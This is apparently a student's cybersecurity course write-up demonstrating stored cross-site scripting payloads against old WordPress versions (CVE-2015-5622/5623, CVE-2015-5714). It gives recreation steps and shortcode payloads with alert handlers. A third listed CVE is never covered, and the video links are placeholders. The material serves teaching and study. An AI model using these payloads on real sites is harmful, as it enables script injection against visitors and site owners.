# Cybersecurity University: Week 7 Assignment
Assignment: Identify and demonstrate POCs for at least 3 exploits affecting older versions of WordPress.

**Exploits demonstrated**:
* [CVE 2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622) / [CVE 2015-5623](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623): Authenticated Stored Cross-Site Scripting (XSS)
* [CVE 2015-5714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714): Authenticated Shortcode Tags Cross-Site Scripting (XSS)
* [CVE 2017-6817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817): Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

## Authenticated Stored Cross-Site Scripting (XSS)

This exploit requires an attacker to have an account with posting capabilities (i.e. a minimum of Contributor level permissions). In this vulnerability, an attacker can insert arbitrary Javascript via a specially-crafted shortcode onto a page or a post.

### Recreating the Exploit
1. Gain access to an account with at least posting-level permissions via social engineering or another exploit. (Alternatively, if the site allows unauthenticated users to post via some special configuration, then an account is not needed.)
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor (not the Visual editor) to insert code similar to the following and post:

```
<a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">link</a>
```
which WP processes to:
```
<a href="</a><a title=" <Event-attribute-with-JS-code-here> ">link</a>
```

### Example
If an attacker puts in the following:
```
<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">link</a>
```
WP processes this to become:
```
<a href="</a><a title=" onmouseover=alert('XSS!') ">link</a>
```
Here, the closing of the first `a` tag and the opening of the second `a` tag are caught up in the first `a` tag's `href` attribute, which means that the first `a` tag now has an `href` attribute **and** an `onmouseover` attribute (the latter of which executes our JS code). So, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS." Of course, one could replace this JS code with something far more malicious.

### Demonstration

The following video demonstrates this exploit: [link goes here]

### Other Details
* **CVEs**: 2015-5622 and 2015-5623
* **Type**: XSS
* **Affects**: WordPress <=4.2.2
* **Patched**: WordPress 4.2.3

## Authenticated Shortcode Tags XSS

Like the last one, this vulnerability also requires the attacker to have an account with posting capabilities. It takes advantage of a shortfall in WordPress's KSES filtering (which filters out non-whitelisted HTML tags). 

### Recreating the Exploit
1. Gain access to an account with at least posting-level permissions via social engineering or another exploit. (Alternatively, if the site allows unauthenticated users to post via some special configuration, then an account is not needed.)
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor (not the Visual editor) to insert code similar to the following and post:

```
[caption width="1" caption='<a href="' ">]</a><a href=" <Event-attribute-with-JS-code-here> ">Click me!</a>
```
which WP processes to:
```
<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" <Event-attribute-with-JS-code-here> ">Click me</a>
```

### Example
If an attacker puts in the following:
```
[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click me!</a>
```
WP processes this to become:
```
<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Click me</a>
```
Here, the closing of the first `a` tag, the `figcaption` tag, and the `figure` tag are all caught up in the first `a` tag's `href` attribute, which means that the first `a` tag now has an `href` attribute **and** an `onmouseover` attribute (the latter of which executes our JS code). (The `figcaption` tag that was opened at the beginning is left hanging.) Thus, like the last vulnerability, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."

### Demonstration

The following video demonstrates this exploit: [link goes here]

### Other Details
* **CVEs**: 2015-5714
* **Type**: XSS
* **Affects**: WordPress <=4.3
* **Patched**: WordPress 4.3.1
